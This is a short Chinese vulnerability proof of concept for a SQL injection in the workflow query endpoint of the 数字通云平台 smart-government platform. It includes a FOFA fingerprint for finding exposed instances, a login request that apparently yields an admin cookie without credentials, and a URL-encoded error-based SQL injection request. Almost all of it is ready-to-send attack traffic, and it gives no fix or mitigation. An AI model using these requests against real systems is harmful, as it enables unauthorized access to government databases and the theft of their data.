# 数字通云平台智慧政务workflow存在SQL注入漏洞

数字通云平台 智慧政务 /workflow/query/index 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa

```java
body="assets/8cca19ff/css/bootstrap-yii.css"
```

## poc

获取cookie

```javascript
POST /portal/default/login HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

userID=admin&flag=rone
```

携带cookie进行注入

```javascript
GET /workflow/query/index?WfRtApplication%5Bselect_user%5D=1%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71786b7a71%2C%28SELECT%20%28ELT%285761=5761%2C1%29%29%29%2C0x7162717871%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29 HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Cookie: your-cookie
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: */*
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409181346234.png)